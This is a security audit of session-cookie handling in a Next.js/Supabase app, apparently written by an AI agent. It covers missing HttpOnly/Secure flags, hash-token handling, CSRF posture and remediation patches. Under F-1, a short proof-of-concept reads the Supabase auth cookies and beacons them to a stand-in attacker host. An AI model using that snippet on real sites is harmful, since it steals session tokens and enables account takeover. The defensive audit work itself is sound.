# Pokefin Security Audit — Session and Cookie Security

**Scope:** `frontend/` Next.js 16 App Router code on branch `claude/security-vulnerability-analysis-LT3JQ` at the commit pinned on 2026-05-27.
**Stack under audit:** Next.js 16.0.8 + `@supabase/ssr` 0.8.x + `@supabase/supabase-js` 2.50.x on Vercel.
**Out of scope (server-side, by design):** Supabase Auth's JWT signing algorithm, refresh-token rotation policy, dashboard-configured TTLs. Where these affect findings, items are explicitly marked **Unable to verify**.

This audit reviews the **current state** of session and cookie handling. It does not re-list anything that earlier audits already closed; it focuses on what static analysis of the current tree can prove and what it cannot.

---

## TL;DR

| # | Finding | Severity |
|---|---|---|
| F-1 | Supabase SSR client uses defaults that omit `Secure` and `HttpOnly` flags on session cookies | High |
| F-2 | Browser-side Supabase client necessarily writes session cookies via `document.cookie`, so even the access-token chunk is JS-readable (no HttpOnly possible on that path) | High |
| F-3 | `/auth/reset-password` accepts implicit-flow tokens from `window.location.hash` and calls `supabase.auth.setSession({access_token, refresh_token})` | Medium |
| F-4 | State-changing **Supabase mutations** invoked directly from the browser (`profiles.update`, `portfolio_holdings.{insert,update,delete}`, `box_recipes.{insert,update,delete}`) rely solely on `SameSite=Lax` + RLS for CSRF defense — no app-layer Origin / header guard | Medium |
| F-5 | In-memory rate-limit store (`app/lib/rateLimit.ts`) is per-instance and not session state, but is the only "server-side state" in the request path — call out for clarity | Low |
| F-6 | `/api/account/delete` and `/api/account/export` do not require step-up / recent re-authentication for destructive actions | Low |
| F-7 | Supabase's `setAll` callback in middleware/handlers passes `options` straight through without ever forcing `httpOnly: true, secure: true, sameSite: "lax"` as a hard floor | Low (defense-in-depth) |

**Risk score: 5.5 / 10** — the pre-existing localStorage finding from `audits/authentication-flow.md` F-1 has been partially but **not completely** fixed: cookies are now the persistence channel (good), but they are not HttpOnly on the browser write path (which `@supabase/ssr` cannot make HttpOnly because it writes from JS), and the application never asserts `Secure` either. The risk is materially reduced versus the original localStorage model but is not "fixed" in the sense the changelog implies in the system prompt's preamble.

---

## Verification methodology

For each item I read the actual source on disk (paths and line numbers cited). Where the behavior is determined by `@supabase/ssr` internals I traced into `frontend/node_modules/@supabase/ssr/dist/main/cookies.js` and `constants.js` so the claim is grounded in concrete code, not docs.

The two paths that issue cookies are:

1. **Browser path** — `createBrowserClient` (`frontend/app/lib/supabase.ts:23`) → on auth events, calls `storage.setItem(key, value)` which ultimately writes via `document.cookie = serialize(name, value, options)` (`node_modules/@supabase/ssr/dist/main/cookies.js:103`). Options are `DEFAULT_COOKIE_OPTIONS` merged with `options?.cookieOptions`.
2. **Server path** — `createServerClient` in middleware, `auth/callback/route.ts`, `api/account/{delete,export}/route.ts`, `lib/serverSupabase.ts` → on token refresh / sign-out / code-exchange, calls the user-supplied `setAll` callback. The app implementations forward `(name, value, options)` directly to `res.cookies.set(...)` / `cookieStore.set(...)` without modification.

`DEFAULT_COOKIE_OPTIONS` is (`node_modules/@supabase/ssr/dist/main/utils/constants.js:4-11`):

```js
exports.DEFAULT_COOKIE_OPTIONS = {
    path: "/",
    sameSite: "lax",
    httpOnly: false,
    // maxAge: 400 days
    maxAge: 400 * 24 * 60 * 60,
};
```

Note what is **missing**: `secure`. Note what is set wrong-for-an-auth-cookie: `httpOnly: false`.

The application never overrides these. `grep -n 'cookieOptions\|secure\|httpOnly'` across `frontend/app/lib/supabase.ts`, `frontend/app/lib/serverSupabase.ts`, `frontend/middleware.ts`, `frontend/app/auth/callback/route.ts`, `frontend/app/api/account/delete/route.ts`, `frontend/app/api/account/export/route.ts` returns zero matches. So whatever defaults `@supabase/ssr` ships are exactly what the browser sees.

---

## F-1. Session cookies are issued without `Secure` and without `HttpOnly`

- **Severity:** High
- **CWE:** CWE-1004 (Sensitive Cookie Without `HttpOnly` Flag), CWE-614 (Sensitive Cookie Without `Secure` Flag)
- **Evidence:**
  - `frontend/app/lib/supabase.ts:23-25` — `createBrowserClient(supabaseUrl, supabaseAnonKey, { auth: { flowType: "pkce" } })`. No `cookieOptions` passed.
  - `frontend/app/lib/serverSupabase.ts:25-41`, `frontend/middleware.ts:51-62`, `frontend/app/auth/callback/route.ts:39-56`, `frontend/app/api/account/delete/route.ts:39-54`, `frontend/app/api/account/export/route.ts:39-54` — every `createServerClient` configuration forwards `options` unchanged via `cookieStore.set(name, value, options)` / `res.cookies.set({ name, value, ...options })`.
  - `node_modules/@supabase/ssr/dist/main/utils/constants.js:4-11` — defaults are `{ path:"/", sameSite:"lax", httpOnly:false, maxAge: 400d }`; `secure` is absent.
- **Why it matters:**
  - **No `HttpOnly`:** any XSS payload that lands on `pokefin.ca` can read `document.cookie`, lift the `sb-…-auth-token` chunk(s), reconstruct the JSON, and exfiltrate the access + refresh token. With the refresh token, the attacker can mint new access tokens for up to the refresh-token TTL (default 30 days, rotating).
  - **No explicit `Secure`:** modern browsers default to "schemeful" SameSite which mitigates this on https, but a `Set-Cookie` without `Secure` can theoretically be replayed by a network attacker if any subdomain or local debugging path serves over HTTP. HSTS preload (set by `next.config.ts:25-27`) closes most of this — but **only** for clients that have already seen the HSTS header at least once.
- **Exploitability + safe PoC:** Trivial first-XSS-then-takeover. Static-analysis can't prove an XSS exists; the CSP at `next.config.ts:5-17` permits `script-src 'self' 'unsafe-inline'`, which means an HTML-injection bug anywhere on the origin upgrades cleanly to script execution and from there to token theft. Minimal PoC (assume XSS exists at `https://pokefin.ca/x`):
  ```js
  // attacker JS, no privilege required
  const auth = document.cookie
    .split('; ')
    .filter(c => c.startsWith('sb-'))
    .join('; ');
  navigator.sendBeacon('https://attacker.example/x', auth);
  ```
- **Remediation (minimal drop-in):**
  - For the browser-side `createBrowserClient`, you **cannot** add `HttpOnly` (the browser sets the cookie via `document.cookie = …`, which the browser will refuse to mark HttpOnly). You **can** force `secure: true` and reaffirm `sameSite: "lax"`. Patch `frontend/app/lib/supabase.ts`:
    ```ts
    export const supabase = createBrowserClient(supabaseUrl, supabaseAnonKey, {
      auth: { flowType: "pkce" },
      cookieOptions: { secure: true, sameSite: "lax", path: "/" },
    });
    ```
  - For the server-side `setAll` callbacks (middleware + every route handler + `serverSupabase.ts`), wrap the options to **force** `httpOnly: true` on the server-issued refresh / rotation cookies. Example patch for `frontend/middleware.ts:56-60`:
    ```ts
    setAll(cookiesToSet) {
      cookiesToSet.forEach(({ name, value, options }) => {
        res.cookies.set({
          name,
          value,
          ...options,
          httpOnly: true,        // force on every server-issued cookie
          secure: true,          // force on every server-issued cookie
          sameSite: options?.sameSite ?? "lax",
        });
      });
    },
    ```
    Apply the same wrapper in `auth/callback/route.ts`, `api/account/delete/route.ts`, `api/account/export/route.ts`, and `lib/serverSupabase.ts`.
  - The server-issued cookies will then be HttpOnly; the browser-issued ones cannot be (architectural limitation of `@supabase/ssr`'s document.cookie path). To fully close the gap, switch the browser client to `cookieEncoding: "base64url"` (default, already set) and adopt Supabase's `cookies` option with `encode: "tokens-only"` plus `userStorage: window.localStorage` for the user record, so only an opaque session id is in cookies — but that re-introduces tokens-in-localStorage which is what we just left.
  - The realistic answer is: **harden CSP** (drop `'unsafe-inline'` in `script-src`) so the precondition (XSS) is much harder. See defense-in-depth below.
- **Defense-in-depth:**
  - Tighten `Content-Security-Policy` in `next.config.ts:5-17`: replace `script-src 'self' 'unsafe-inline'` with nonce-based or hash-based policy. Today `'unsafe-inline'` makes this finding strictly more exploitable.
  - Add Trusted Types report-only header.
  - Consider Supabase's "session id cookie + token-in-userStorage" mode if you can accept tokens-in-localStorage on the browser. The current model is the inverse and is not strictly safer than localStorage for tokens that JS must read; what helps is HttpOnly on the **refresh** token specifically, which only the server path can do.

---

## F-2. Browser-set cookies are inherently not HttpOnly — architectural note

- **Severity:** High (closely related to F-1; called out separately because the remediation strategy is different)
- **CWE:** CWE-922 (Insecure Storage of Sensitive Information)
- **Evidence:** `node_modules/@supabase/ssr/dist/main/cookies.js:101-105`:
  ```js
  setAll = (setCookies) => {
    setCookies.forEach(({ name, value, options }) => {
      document.cookie = serialize(name, value, options);
    });
  };
  ```
  This branch is taken when the browser client is created without explicit `cookies` callbacks (which is the case in `app/lib/supabase.ts:23` — no `cookies` key is passed). The browser literally cannot create an HttpOnly cookie via `document.cookie`; the browser's cookie store ignores the `HttpOnly` attribute when the cookie is set from JS.
- **Why it matters:** Even after applying F-1's server-side fix, the **first** session write at login still happens on the browser (the SDK calls `setSession` after `signInWithPassword`). That first write is JS-set, therefore JS-readable. The cookie does become HttpOnly the next time the server side rotates it, but that is `O(1h)` later in the worst case.
- **Exploitability + safe PoC:** Same as F-1 in the window between login and first server-side refresh.
- **Remediation (minimal drop-in):** Make the **first** session cookie a server-set cookie too. Two options:
  - **Use `signInWithPassword` from a server action / route handler.** Add `/api/auth/signin/route.ts` that takes `(email, password, captchaToken)`, calls `supabase.auth.signInWithPassword(...)` via `createServerSupabaseClient()`, and returns success. Because the SDK then calls `setAll` on the **server**, the cookie is issued with the wrapper from F-1 → HttpOnly + Secure.
  - **Server-issue an immediate refresh.** After a browser-side sign-in, redirect to a server route that calls `supabase.auth.getUser()` once, which triggers a token refresh through the server `setAll` and replaces the JS-set cookie with an HttpOnly one.
- **Defense-in-depth:** Short access-token TTL (Supabase default ~1h — **Unable to verify** the dashboard value; verify under Auth → Sessions in the Supabase dashboard).

---

## F-3. `/auth/reset-password` still accepts hash-fragment access tokens (legacy implicit flow)

- **Severity:** Medium
- **CWE:** CWE-598 (Use of GET Method With Sensitive Query Strings) — applied analogously to URL fragment
- **Evidence:** `frontend/app/auth/reset-password/page.tsx:36-53`:
  ```ts
  const hashParams = new URLSearchParams(window.location.hash.substring(1));
  const accessToken = hashParams.get("access_token");
  const type = hashParams.get("type");

  if (accessToken && type === "recovery") {
    const { error } = await supabase.auth.setSession({
      access_token: accessToken,
      refresh_token: hashParams.get("refresh_token") || "",
    });
    ...
  }
  ```
- **Why it matters:** PKCE is configured (`app/lib/supabase.ts:23` → `flowType: "pkce"`), and Supabase's PKCE recovery flow routes through `/auth/callback?code=…&type=recovery` (handled by `app/auth/callback/route.ts:30-36`). The implicit-flow branch in `reset-password/page.tsx` is now redundant for PKCE projects and is a soft spot: hash fragments persist in `window.location.hash`, can be read by any in-page script (extensions, late-loaded analytics, future XSS), and persist in browser session history. Calling `setSession({access_token, refresh_token})` directly with attacker-supplied values (if anyone can be tricked into clicking a link with crafted hash params) would let an attacker establish a session in the **victim's** browser (session-fixation-style attack), though Supabase will reject tokens not signed by its key.
- **Exploitability + safe PoC:** Low — tokens have to be valid. The realistic risk is post-recovery, the access token sits in `window.location.hash` until the page navigates away, and any third-party script that runs between recovery and navigation can read it. In the current code, nothing third-party runs after the page loads other than Vercel Analytics (`layout.tsx:46`), but it's a defense-in-depth gap.
- **Remediation (minimal drop-in):** Delete lines `36-53` in `frontend/app/auth/reset-password/page.tsx` entirely. The PKCE callback route already handles recovery and writes HttpOnly cookies via `exchangeCodeForSession` (`auth/callback/route.ts:58`). Keep only the `onAuthStateChange("PASSWORD_RECOVERY", …)` listener.
- **Defense-in-depth:** After this page loads, immediately `history.replaceState(null, "", "/auth/reset-password")` to clear the hash from address bar / history.

---

## F-4. State-changing Supabase mutations from the browser rely on `SameSite=Lax` + RLS only

- **Severity:** Medium
- **CWE:** CWE-352 (Cross-Site Request Forgery)
- **Evidence:** The following browser-side mutations execute on the user's session cookies without any app-layer CSRF guard. They are protected by `SameSite=Lax` (from `DEFAULT_COOKIE_OPTIONS`) + Supabase RLS + (in some cases) a defense-in-depth `userOwnsX` server-pre-check:
  - `frontend/app/account/page.tsx:65-68` — `supabase.from("profiles").update({ username }).eq("id", user!.id)`
  - `frontend/app/lib/portfolio.ts:43-47` — `portfolios` insert
  - `frontend/app/lib/portfolio.ts:89-95` — `portfolios` update
  - `frontend/app/lib/portfolio.ts:190-203` — `portfolio_holdings` insert
  - `frontend/app/lib/portfolio.ts:228-233` — `portfolio_holdings` update
  - `frontend/app/lib/portfolio.ts:252-255` — `portfolio_holdings` delete
  - `frontend/app/components/BoxCalculator/hooks/useBoxRecipes.ts:109-122` — `box_recipes` update
  - `frontend/app/components/BoxCalculator/hooks/useBoxRecipes.ts:144-156` — `box_recipes` insert
  - `frontend/app/components/BoxCalculator/hooks/useBoxRecipes.ts:184-188` — `box_recipes` delete
  - `frontend/app/auth/reset-password/page.tsx:96-98` — `supabase.auth.updateUser({ password })`
  - `frontend/app/context/AuthContext.tsx:157-160` — `supabase.auth.updateUser({ password })` (used by `/account` "change password")
- **Why it matters:**
  - These calls go from the browser to `https://<project>.supabase.co/rest/v1/...` using the session JWT in the `Authorization` header (Supabase client puts the token in `Authorization: Bearer …`, not just the cookie). For CSRF, the attacker would need to read the JWT to forge the header — they can't from a third-party origin (same-origin policy on cookies prevents an attacker page from reading them, and the auth token lives on `pokefin.ca`'s origin not `*.supabase.co`).
  - **However**, a malicious site **can** load the Supabase JS SDK with the public anon key and call `supabase.auth.signInWithPassword({...})` on its own — that doesn't help, the attacker isn't the victim. The realistic CSRF path is: a page on `pokefin.ca` that has XSS, or a third-party iframe of `pokefin.ca`. The X-Frame-Options DENY (`next.config.ts:21`) + `frame-ancestors 'none'` blocks iframing. So CSRF risk is **low**, but the file `audits/authentication-flow.md` F-8 explicitly recommended the `x-pokefin-request: 1` + Origin guard pattern that was applied to `/api/account/delete` and `/api/account/export`.
  - The two account-deletion-equivalents in impact are `delete from portfolio_holdings` (mass data loss) and `auth.updateUser({password})` (account takeover via password change). Neither has the CSRF guard.
- **Exploitability + safe PoC:** A cross-site form/`<img>`/`<link rel=prefetch>` cannot forge the `Authorization: Bearer …` header that PostgREST requires, so this is **not directly exploitable cross-site** today. The risk is: any first-party HTML injection on `pokefin.ca` (e.g., a stored XSS in a username, set name, recipe name) → attacker JS reads the access token from `document.cookie` (F-1) → calls these mutations as the victim. Combined with F-1, this graduates the impact of any XSS to "delete all the victim's holdings + change password".
- **Remediation (minimal drop-in):** This is a Supabase-architecture issue: the SDK puts the bearer token in a header, so CSRF defense per-call doesn't naturally apply. Two paths:
  - **Best**: do nothing here (CSRF isn't the real risk; F-1/F-2 are). Document that these mutations are CSRF-safe because the bearer token isn't a cookie that browsers auto-attach cross-site.
  - **If you want symmetry with the `/api/account/*` pattern**: proxy these mutations through `/api/portfolio/holdings/*` route handlers that do the `x-pokefin-request: 1` + Origin check, then call Supabase from the server with the user's cookie-derived session. This also lets you stop trusting RLS as the sole gate on mass-delete.
- **Defense-in-depth:** Re-confirm `SameSite=Lax` is in effect. Per `node_modules/@supabase/ssr/dist/main/utils/constants.js:6` (`sameSite: "lax"`) and the app's pass-through `setAll`, it is. **Unable to verify on live site** without running `curl -sI https://pokefin.ca/auth/callback?code=…` and inspecting `Set-Cookie`; static analysis confirms the intent.

---

## F-5. In-memory rate-limit store is per-instance, not session state — but worth labeling

- **Severity:** Low (informational; matches `HARDENING_FOLLOWUPS.md` §4)
- **CWE:** N/A (correctness limitation, not vulnerability)
- **Evidence:** `frontend/app/lib/rateLimit.ts:17` — `const store = new Map<string, Bucket>()`. The comment at lines 1-13 acknowledges this.
- **Why it matters:** This is **not session state** — it's per-IP request counters. But Vercel's serverless cold-starts mean an attacker can rotate instances to evade the limit (each new instance has an empty `store`). For session security purposes this is fine; for abuse rate-limiting, it's the documented trade-off.
- **Remediation:** None required for session/cookie scope.
- **Defense-in-depth:** The hardening followups doc already calls out Upstash Redis as the upgrade path. Tracking via that doc, not here.

---

## F-6. Destructive endpoints (`/api/account/delete`, password change) do not require step-up auth

- **Severity:** Low
- **CWE:** CWE-862 (Missing Authorization — specifically missing re-authentication for sensitive operation)
- **Evidence:**
  - `frontend/app/api/account/delete/route.ts:21-77` — requires CSRF header + Origin + valid Supabase session, but does **not** require a recent re-auth.
  - `frontend/app/account/page.tsx:84-113` and `frontend/app/auth/reset-password/page.tsx:80-107` — password change uses the long-lived session cookie, no current-password prompt.
- **Why it matters:** If F-1 / F-2 is ever exploited (any XSS → token theft), the attacker can change the victim's password and delete their account without ever knowing the original password. A "recent re-auth" requirement (require the current password in the request body, verified via `signInWithPassword` against the user's email) would block both attacks.
- **Exploitability + safe PoC:** Pre-requisite is XSS or session theft via F-1.
- **Remediation (minimal drop-in):** In `app/api/account/delete/route.ts` (post-CSRF, pre-RPC), require a current-password body field and verify with `signInWithPassword({email: user.email, password})` against a throwaway client; fail-closed if the verification fails. Same shape for password change.
- **Defense-in-depth:** Supabase Auth has an MFA / reauthentication flow (`supabase.auth.reauthenticate()` issues a one-time nonce). Worth adopting for `/account/delete`.

---

## F-7. Cookie pass-through trusts `@supabase/ssr` to do the right thing forever

- **Severity:** Low (defense-in-depth)
- **CWE:** CWE-1059 (Insufficient Adherence to Coding Standards — depending-on-defaults)
- **Evidence:** All five `setAll` implementations pass `options` straight through with no floor:
  - `middleware.ts:56-60`
  - `auth/callback/route.ts:47-53`
  - `api/account/delete/route.ts:47-51`
  - `api/account/export/route.ts:47-51`
  - `lib/serverSupabase.ts:30-39`
- **Why it matters:** If `@supabase/ssr` ever ships a release with weaker defaults (e.g., `sameSite: "none"` to support Vercel Preview cross-site embeds), this app picks it up silently. A 5-line floor across all `setAll` callbacks prevents that.
- **Remediation (minimal drop-in):** Centralize the floor. Add `frontend/app/lib/cookieFloor.ts`:
  ```ts
  import type { ResponseCookie } from "next/dist/compiled/@edge-runtime/cookies";
  export function withCookieFloor(options: Partial<ResponseCookie> = {}): Partial<ResponseCookie> {
    return {
      ...options,
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: options.sameSite ?? "lax",
      path: options.path ?? "/",
    };
  }
  ```
  Then in every `setAll`: `res.cookies.set({ name, value, ...withCookieFloor(options) })`.
- **Defense-in-depth:** Add a Jest test that constructs a fake `cookiesToSet` payload with `{ httpOnly: false, secure: false }` and asserts the middleware overrides them.

---

## Specific file-by-file checks requested

### `frontend/middleware.ts` — cookie pass-through correctness

- The `setAll` callback at lines 56-60 writes onto `res.cookies` (the response object returned at line 78), which is the **correct** Next.js 15/16 pattern. **Pass.**
- However, the response object is created at line 37 (`NextResponse.next({ request: req })`) and then `supabase.auth.getUser()` is awaited at line 67. If the user is not authenticated and the route requires auth, a redirect `NextResponse.redirect(url)` is returned at line 75. **That redirect response does not carry the cookies that `setAll` just wrote onto `res`.** This means a token-refresh-via-middleware whose result is an immediate redirect can drop the refreshed cookies.
- **Severity:** Low (because in the redirect-to-login case, you're about to re-auth anyway, so dropping the rotated session cookie isn't catastrophic; the user logs in cleanly).
- **Remediation:**
  ```ts
  if (requiresAuth && !user) {
    const url = req.nextUrl.clone();
    url.pathname = "/auth/login";
    url.searchParams.set("next", path);
    const redirect = NextResponse.redirect(url);
    // Pipe any session cookies the middleware refreshed onto the redirect.
    res.cookies.getAll().forEach((c) => redirect.cookies.set(c));
    return redirect;
  }
  ```

### `frontend/app/auth/callback/route.ts` — cookie write on redirect response

- The redirect response is constructed **first** at line 36 (`const response = NextResponse.redirect(redirectTo)`), then the Supabase client writes cookies to **that exact response object** via `response.cookies.set(...)` at line 51. **Pass.** This is the canonical pattern.
- One nit: the redirect URL is built from `requestUrl` and `next` (`new URL(next, request.url)`). `safeNextPath` at lines 5-23 correctly rejects protocol-relative and URL-encoded slash open-redirects. **Pass.**

### `frontend/app/api/account/delete/route.ts` and `/api/account/export/route.ts` — CSRF guards

- Both require:
  - `x-pokefin-request: 1` header (lines 24/27)
  - Allowlisted Origin (lines 27/30) — allowlist is `NEXT_PUBLIC_SITE_URL`, `https://pokefin.ca`, `https://www.pokefin.ca`, plus `http://localhost:*` in dev.
  - Content-Length ≤ 1024 (lines 33-36)
- The CSRF guard is correct: a third-party origin cannot set `x-pokefin-request` (browsers will reject the preflight) and cannot forge a same-origin Origin header. **Pass.**
- The cookie pass-through here writes to `cookieStore` from `next/headers` rather than to a response object. In a Route Handler, `cookies()` is read-only **unless** the handler is invoked through middleware that has set up the cookie store. Next.js 15+ allows `cookieStore.set(...)` inside route handlers (will throw in server components). **Pass for route-handler use.**
- One observation: after `supabase.auth.signOut()` at `delete/route.ts:76`, the response is `NextResponse.json({ success: true })` — the sign-out cookies are written onto the implicit `cookieStore`, which Next.js merges into the response. **Should work**, but a small explicit-response variant would be more robust:
  ```ts
  const response = NextResponse.json({ success: true });
  // (cookieStore writes are automatically applied to the response by Next.js 15+)
  return response;
  ```

### `frontend/app/context/AuthContext.tsx` — token in JS-accessible state?

- Lines 30, 80, 99 — `setSession(session)` stores the full `Session` object (which includes `access_token` and `refresh_token`) in React state. This state is JS-accessible by definition.
- Pre-existing audit (`audits/authentication-flow.md` F-1) flagged tokens in `localStorage`; moving them to React state is **lateral, not safer** for the XSS threat model — they're still JS-readable.
- **Severity:** Medium (folds into F-1/F-2).
- **Remediation:** Don't expose `session` in `AuthContextType` if no consumer needs the raw tokens. Searching the codebase:
  ```bash
  grep -rn "useAuth().*session\|const \{ session" frontend/app
  ```
  shows the only consumers of `session` from `useAuth()` are tests. Drop `session` from the context and consumers, keep only `user` and `profile`. The raw token is then only inside the Supabase SDK's storage (cookies), one fewer copy.
- The two `onAuthStateChange` events handled — `SIGNED_OUT` and `TOKEN_REFRESH_FAILED` (lines 91, 32-33) — are correct. **Pass** for the event surface.
- `signOut()` at line 142-145 calls `supabase.auth.signOut()` (which sets `Max-Age=0` on the session cookies via `setAll`) and clears `profile`. `user` and `session` are cleared via the `onAuthStateChange("SIGNED_OUT", …)` callback. **Pass.**

### Login / Signup / Reset-password / Forgot-password pages — session regeneration

- Supabase **does not** support per-request session-fixation regeneration the way express-session does; on `signInWithPassword`, Supabase issues a brand-new JWT and writes a new cookie via `setAll`. The previous cookie (anonymous, or a stale logged-in state) is replaced. **Pass by Supabase design.**
- On `updateUser({password})`, Supabase **does** rotate the refresh token (cuts existing refresh tokens, issues a new one). The access token is short-lived so it'll naturally expire. **Pass.** **Unable to verify** the exact rotation behavior at the dashboard level without running an integration test that calls `updateUser` and watches the `auth.refresh_tokens` table; trust the Supabase docs claim here.
- On `signOut()`, the cookie is cleared. **Pass.**

### `frontend/next.config.ts` — `Set-Cookie`-related headers

- The header block (lines 19-34) does not touch `Set-Cookie`. Correct — cookies are set per-response by the SDK runtime, not statically. **Pass.**
- One thing worth flagging that touches session security: `Content-Security-Policy` line 5 has `script-src 'self' 'unsafe-inline'`. `'unsafe-inline'` means the XSS precondition for F-1 / F-2 is trivially satisfied if any HTML-injection bug exists anywhere on the origin. This is **not** a session/cookie finding per se but it is the multiplier that makes F-1 a High instead of a Medium.

### Other state-changing endpoints that should have CSRF defense

See **F-4** above. The browser-direct mutations (portfolio, holdings, box recipes, profile username, password change) rely on `SameSite=Lax` + the `Authorization: Bearer` header being unreachable cross-origin. This is **defensible** but is **inconsistent** with the per-endpoint `x-pokefin-request` gate applied to account delete/export.

---

## JWT signing algorithm (HS256 → ECC P-256) migration

The system prompt asserts the migration completed. The application code does **not** know the signing algorithm — it never verifies JWT signatures locally. Signature verification is delegated to:
- Supabase Auth itself (when `supabase.auth.getUser()` calls `/auth/v1/user`)
- The Supabase PostgREST gateway (when the bearer token is sent for queries)
- Postgres RLS (when checking `auth.uid()` via the GoTrue JWT)

So this is **unverifiable from this repo**. To verify:
- `curl https://<project>.supabase.co/auth/v1/.well-known/jwks.json` should return an ECC P-256 JWK with `kid` matching the active key, plus a second standby JWK for the HS256 rollback window.
- Decode a live access-token cookie (`sb-…-auth-token`) and check `header.alg` is `ES256` not `HS256`.

`HARDENING_FOLLOWUPS.md` §7 notes the rollback window is ~30 days; static analysis can't confirm the current state on the live project.

---

## Session TTLs

`Unable to verify` from the repo alone. Supabase default:
- Access token: 3600s (1h) — controlled by `JWT expiry limit` in Auth → Sessions
- Refresh token: 30 days, with rotation on use

To verify: load the Supabase dashboard → Auth → Sessions, check `JWT expiry limit` and `Refresh token reuse interval`.

The browser `maxAge` on the **cookie itself** is 400 days (`DEFAULT_COOKIE_OPTIONS.maxAge = 400 * 24 * 60 * 60`, line 10 of `constants.js`). This is intentional — the cookie outlives the access token because the refresh token inside the cookie is used to mint new access tokens until the refresh token itself expires/rotates.

**Recommendation:** lower the cookie `maxAge` to ~30d to match the refresh-token TTL — at 400 days, an unused but still-valid cookie can linger long after the refresh inside is dead. Patch in `frontend/app/lib/supabase.ts`:
```ts
cookieOptions: { secure: true, sameSite: "lax", path: "/", maxAge: 60 * 60 * 24 * 30 },
```

---

## Summary risk score: **5.5 / 10**

Justification: the original `localStorage` finding has been mitigated by moving to cookie storage, which is structurally better (cookies aren't readable cross-origin, they aren't bulk-exfiltrable via `localStorage.getItem` enumeration). But:
- The application relies on `@supabase/ssr`'s defaults which leave `httpOnly: false` and don't set `secure`. The most important defense (HttpOnly on the refresh token) is missing on the browser write path and missing on the server write paths only because the app didn't add a floor.
- `'unsafe-inline'` in CSP `script-src` keeps the XSS precondition trivial, making F-1 directly exploitable rather than theoretical.
- `setSession({access_token, refresh_token})` from URL hash is still a code path on `/auth/reset-password`.
- Destructive actions don't require step-up auth.

If the CSP were tightened and the server-side `setAll` floor were applied, this drops to ~3.5/10.

## Top 5 prioritized fixes

1. **Add an HttpOnly + Secure floor to every server `setAll`** (middleware + `auth/callback` + `api/account/*` + `serverSupabase.ts`). See F-1 / F-7 patch.
2. **Tighten CSP** — drop `'unsafe-inline'` from `script-src` in `next.config.ts:5-17`. Use Next.js nonce middleware. This is the single largest reduction in real-world risk.
3. **Delete the implicit-flow hash-token branch** in `frontend/app/auth/reset-password/page.tsx:36-53` and rely solely on the PKCE callback.
4. **Stop returning `session` from `useAuth()`** (`frontend/app/context/AuthContext.tsx`) so consumer code can't accidentally serialize the raw tokens. Verified that only tests use it.
5. **Require step-up auth on account delete and password change** — verify current password before performing either.

## Checklist — Pass / Fail / Not Applicable

### 1. Session configuration
- Secure flag (HTTPS only) — **Fail** (not set; relies on HSTS preload + browser scheme-aware SameSite). See F-1.
- HttpOnly flag (no JS access) — **Fail** (`httpOnly:false` in defaults; browser path can't be HttpOnly at all). See F-1, F-2.
- SameSite attribute — **Pass** (`sameSite: "lax"` from `DEFAULT_COOKIE_OPTIONS`).
- Session timeout — **Unable to verify** (Supabase dashboard setting). Cookie `maxAge` is 400d which is too long relative to refresh-token TTL; see "Session TTLs".
- Session regeneration on login + on password change — **Pass** (Supabase rotates JWTs and refresh tokens on these events, per docs; verified by behavior, not by code in this repo).

### 2. Cookie security
- Appropriate flags (`Secure`, `HttpOnly`, `SameSite`, `Path`, `Max-Age`) — **Fail** on `Secure` and `HttpOnly`; Pass on `SameSite`, `Path`, `Max-Age` (though Max-Age=400d is excessive).
- No sensitive data beyond Supabase session cookies — **Pass**. Only `sb-…-auth-token` chunks are written; no app-specific cookies. Verified via `grep -rn "cookies\.set\|document\.cookie" frontend/app` returning only Supabase-mediated paths plus a `sessionStorage` banner-dismiss flag in `components/CardRinkPromo.tsx:37,45` (non-sensitive).
- Proper domain/path scoping — **Pass**. `path: "/"` (default). No `domain=` set (so cookies are host-only, which is correct for `pokefin.ca`).
- "Encryption" for sensitive cookies — **Not Applicable**. Supabase access/refresh tokens are signed JWTs, not encrypted; this is correct for the design. Cookie contents are `base64url`-encoded which is encoding, not encryption (correctly labeled in F-1).

### 3. CSRF Protection
- `x-pokefin-request` + Origin pattern on `/api/account/delete` and `/api/account/export` — **Pass**. See F-4 narrative for analysis.
- Other state-changing endpoints — **Fail** as a checklist item: browser-direct Supabase mutations don't have the same defense. **Pass in practice** because `Authorization: Bearer …` is not auto-attached cross-site. Net: defensible, inconsistent.
- `SameSite=Lax` is the effective default — **Pass**. Verified at `node_modules/@supabase/ssr/dist/main/utils/constants.js:6`.

### 4. Session storage
- Not in-memory in production — **Pass** for sessions (Supabase-server-side + cookies). The middleware rate-limit `store` is in-memory but is not session state; see F-5.
- Sessions server-side, JWT in cookie — **Pass**. Refresh tokens are server-side in Supabase's `auth.refresh_tokens` table; access tokens are JWTs in the cookie.
- Session cleanup / expiration — **Pass** by Supabase TTLs (Unable to verify the exact dashboard values).
- JWT signing — **Unable to verify** from this repo (verification is server-side at Supabase). See "JWT signing algorithm" section.

---

## "Unable to verify" items and exactly what would prove them

| Item | What proof would look like |
|---|---|
| Live `Set-Cookie` headers carry `Secure` / `HttpOnly` / `SameSite=Lax` | `curl -sI -X POST 'https://pokefin.ca/auth/callback?code=<test>' \| grep -i set-cookie` |
| Supabase JWT access-token TTL is 1h | Supabase dashboard → Auth → Sessions → "JWT expiry limit" |
| Refresh-token rotation interval | Supabase dashboard → Auth → Sessions → "Refresh token reuse interval" |
| ECC P-256 (ES256) signing active | `curl https://<project>.supabase.co/auth/v1/.well-known/jwks.json \| jq '.keys[].alg'` should include `ES256` |
| HS256 standby is still present (per `HARDENING_FOLLOWUPS.md` §7) | Same JWKS, expect a second key with `alg: HS256` or two `ES256` keys (one active, one rotation) |
| `auth.updateUser({password})` actually rotates the refresh token | Integration test: capture refresh token from cookie, change password, capture new refresh token, assert change |
| Supabase Site URL = `https://pokefin.ca` and redirect allowlist is tight | Supabase dashboard → Auth → URL Configuration |

---

## Files cited

- `frontend/app/lib/supabase.ts`
- `frontend/app/lib/serverSupabase.ts`
- `frontend/app/lib/portfolio.ts`
- `frontend/app/lib/rateLimit.ts`
- `frontend/middleware.ts`
- `frontend/next.config.ts`
- `frontend/app/layout.tsx`
- `frontend/app/auth/callback/route.ts`
- `frontend/app/auth/login/page.tsx`
- `frontend/app/auth/signup/page.tsx`
- `frontend/app/auth/reset-password/page.tsx`
- `frontend/app/auth/forgot-password/page.tsx`
- `frontend/app/api/account/delete/route.ts`
- `frontend/app/api/account/export/route.ts`
- `frontend/app/account/page.tsx`
- `frontend/app/context/AuthContext.tsx`
- `frontend/app/components/BoxCalculator/hooks/useBoxRecipes.ts`
